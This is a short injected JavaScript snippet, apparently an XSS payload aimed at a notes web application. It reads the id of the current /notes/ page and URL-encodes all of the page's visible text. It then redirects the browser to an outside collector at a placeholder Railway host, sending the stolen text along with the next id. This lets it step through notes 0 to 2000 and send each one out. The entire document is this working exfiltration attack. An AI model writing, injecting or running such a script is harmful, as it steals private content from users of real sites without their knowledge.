<script>
(function () {
    const BASE = "https://your-app.up.railway.app";

    const parts = location.pathname.split("/");
    let id = parseInt(parts[parts.length - 1]);

    if (isNaN(id)) {
        location.href = "/notes/0";
        return;
    }

    if (id > 2000) return;

    const data = encodeURIComponent(document.body.innerText);

    location.href =
        BASE +
        "?id=" + id +
        "&d=" + data +
        "&next=" + (id + 1);
})();
</script>
